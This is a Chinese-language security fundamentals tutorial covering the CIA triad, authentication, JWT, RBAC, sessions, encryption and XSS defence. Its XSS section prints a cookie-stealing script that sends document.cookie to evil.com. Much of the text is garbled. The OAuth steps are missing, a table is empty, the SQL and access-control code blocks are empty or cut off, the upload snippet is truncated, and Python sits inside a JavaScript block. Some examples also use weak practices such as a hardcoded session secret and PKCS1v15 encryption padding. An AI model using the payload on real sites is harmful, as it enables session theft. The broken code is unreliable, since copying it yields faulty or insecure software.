# 安全基础

## 概念

**信息安全**旨在保护数据的**机密性**、**完整性**和**可用性** (CIA 三元组)。

```
┌─────────────────────────────────────┐
│           CIA 三元组                │
├─────────────────────────────────────┤
│                                     │
│  机密性 (Confidentiality)           │
│  → 数据不被未授权访问                │
│                                     │
│  完整性 (Integrity)                 │
│  → 数据不被未授权篡改                │
│                                     │
│  可用性 (Availability)              │
│  → 合法用户可正常访问数据            │
│                                     │
└─────────────────────────────────────┘
```

## 关系

**关键连接**：
- 身份认证 → **授权**：确认身份后决定访问权限
- 加密 → **机密性**：防止数据被窃取
- 数字签名 → **完整性**：验证数据未被篡改
- 漏洞 → **攻击面**：安全薄弱点可能被利用

## 常见安全威胁

### 攻击类型

| 威胁 | 描述 | 示例 |
|------|------|------|
| 注入攻击 | 将恶意代码注入输入 | SQL 注入、XSS、命令注入 |
| 认证绕过 | 跳过身份验证机制 | Session 劫持、Cookie 伪造 |
| 权限提升 | 获得超出应有权限 | Linux 提权漏洞 |
| 拒绝服务 | 使服务不可用 | DDoS、CC 攻击 |
| 中间人攻击 | 拦截通信双方 | WiFi 窃听、会话劫持 |
| 社会工程 | 利用人性弱点 | 钓鱼邮件、电信诈骗 |

### 恶意软件类型

| 类型 | 传播方式 | 危害 |
|------|----------|------|
| 病毒 | 感染文件 | 破坏数据、窃取信息 |
| 蠕虫 | 网络自动传播 | 消耗带宽、植入后门 |
| 木马 | 伪装成正常软件 | 远程控制、信息窃取 |

## 身份认证

### 密码认证

```javascript
// 密码哈希存储 (bcrypt)
const bcrypt = require('bcrypt');

async function hashPassword(password) {
    const saltRounds = 12;
    return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
    return await bcrypt.compare(password, hash);
}
```

**密码安全原则**：
- 使用 bcrypt/argon2 等自适应哈希
- 避免简单密码 (彩虹表攻击)
- 启用多因素认证 (MFA)

### 多因素认证 (MFA)

```bash
# MFA 类型
# 1. 知识因素 - 知道的 (密码)
# 2. 持有因素 - 拥有的 (手机,硬件令牌)
# 3. 生物因素 - 是的 (指纹,面部识别)

# TOTP (基于时间的一次性密码)
# 生成: TOTP = HMAC-SHA1(secret, counter)
# 验证: 服务端用相同密钥计算并比对

# 示例: Google Authenticator
# 用户扫描二维码获取 secret
# 每 30 秒生成 6 位数字
```

### JWT 认证

```javascript
// JWT 生成
const jwt = require('jsonwebtoken');

function generateToken(user) {
    return jwt.sign(
        { id: user.id, email: user.email },
        process.env.JWT_SECRET,
        { expiresIn: '1h' }
    );
}

// JWT 验证中间件
function authMiddleware(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) {
        return res.status(401).json({ error: 'No token' });
    }
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.user = decoded;
        next();
    } catch (err) {
        return res.status(401).json({ error: 'Invalid token' });
    }
}
```

**OAuth 2.0 授权流程**：

2. 跳转 GitHub 授权页面

4. GitHub 返回 Authorization Code
5. 后端用 Code 换取 Access Token
6. 用 Token 获取用户信息

| 授权类型 | 场景 | 说明 |
|----------|------|------|

## 授权与访问控制

### RBAC (基于角色的访问控制)

```javascript
// 角色定义
const roles = {
    admin: ['read', 'write', 'delete', 'manage_users'],
    editor: ['read', 'write'],
    viewer: ['read']
};

// 权限检查中间件
function requirePermission(permission) {
    return (req, res, next) => {
        const userRole = req.user?.role;
        if (!userRole || !roles[userRole]?.includes(permission)) {
            return res.status(403).json({ error: 'Forbidden' });
        }
        next();
    };
}

// 使用
app.delete('/users/:id',
    authMiddleware,
    requirePermission('manage_users'),
    deleteUser
);
```

```
RBAC 模型:

┌─────────┐     ┌─────────┐     ┌─────────┐
│  用户   │────►│  角色   │────►│  权限   │
└─────────┘     └─────────┘     └─────────┘
                     │
                     ├── admin ──── 所有权限
                     ├── editor ──── 读写
                     └── viewer ──── 只读
```

```sql
-- RBAC 数据库表设计

```

```javascript
// 更细粒度的访问控制
function canAccessResource(user, resource) {
    return (
        // 用户属性匹配资源属性

    );

```

## 会话管理

### Session vs Token

| 特性 | Session | JWT |
|------|---------|-----|
| 存储位置 | 服务端 (Redis/数据库) | 客户端 |
| 扩展性 | 需共享 session | 无状态 |
| 撤销能力 | 可立即撤销 | 需黑名单 |
| 数据量 | 小 | 可存储更多 |
| 适用场景 | 有状态服务 | 微服务,跨域 |

```javascript
// Express Session
const session = require('express-session');
const RedisStore = require('connect-redis');

app.use(session({
    store: new RedisStore({ client: redisClient }),
    secret: 'your-secret',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true,      // HTTPS only
        httpOnly: true,    // JS 无法访问
        maxAge: 1000 * 60 * 60 * 24  // 24 小时
    }
}));

// 使用 session
app.post('/login', (req, res) => {
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ success: true });
});
```

## 加密基础

### 对称加密

加密和解密使用相同密钥：

```python
from cryptography.fernet import Fernet

# 生成密钥
key = Fernet.generate_key()
cipher = Fernet(key)

# 加密
encrypted = cipher.encrypt(b"Secret message")

# 解密
decrypted = cipher.decrypt(encrypted)
```

| 算法 | 特点 | 典型用途 |
|------|------|----------|
| AES | 安全可靠，高效 | 数据加密 |
| ChaCha20 | 移动端友好 | 实时通信 |
| DES | 已不安全 | 遗留系统 |

### 非对称加密

使用公钥加密，私钥解密：

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

# 生成密钥对
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# 加密 (用公钥)
encrypted = public_key.encrypt(
    b"Secret message",
    padding.PKCS1v15()
)

# 解密 (用私钥)
decrypted = private_key.decrypt(
    encrypted,
    padding.PKCS1v15()
)
```

### 哈希与数字签名

```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_private_key

# 计算消息摘要 (SHA-256)
import hashlib
digest = hashlib.sha256(b"Message").hexdigest()

# 数字签名
private_key = load_pem_private_key(key_data, password=None)
signature = private_key.sign(
    b"Message to sign",
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

# 验证签名
public_key.verify(
    signature,
    b"Message to sign",
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)
```

## Web 安全

### XSS (跨站脚本攻击)

```html
<!-- 恶意 XSS payload -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

**XSS 防御措施**：

```javascript
// 1. 客户端转义（不推荐作为主要防御）
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// 2. 服务器端转义（Python示例）
import html

def escape_for_html(untrusted_string):
    return html.escape(untrusted_string, quote=True)

// 3. React 自动转义
// 安全：React 默认转义 HTML 内容
const Safe = () => <div>{userInput}</div>;

// 危险：直接插入 HTML（可能引发 XSS）
const Dangerous = () => <div dangerouslySetInnerHTML={{__html: userInput}} />;

// 4. Content Security Policy (CSP) - 防御-in-depth
// HTTP 头配置
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce随机值'
```

**Cookie 防护**：
```http
<!-- HttpOnly 防止 JavaScript 访问 Cookie -->
```

### 文件上传安全

```javascript
    dest: 'uploads/',

            cb(null, true);
        } else {
            cb(new Error('Invalid file type'));
        }
    }
});
```

```javascript
// 检测异常登录
function detectAnomaly(loginAttempt) {
    if (loginAttempt.ip !== loginAttempt.user.lastLoginIp ||
        loginAttempt.timestamp - loginAttempt.user.lastLoginTime > 24 * 60 * 60 * 1000) {
        securityLogger.log('ANOMALY', {
            event: 'Suspicious login',
            user: loginAttempt.user.id,
            details: loginAttempt
        });
        // 发送告警
    }
}
```
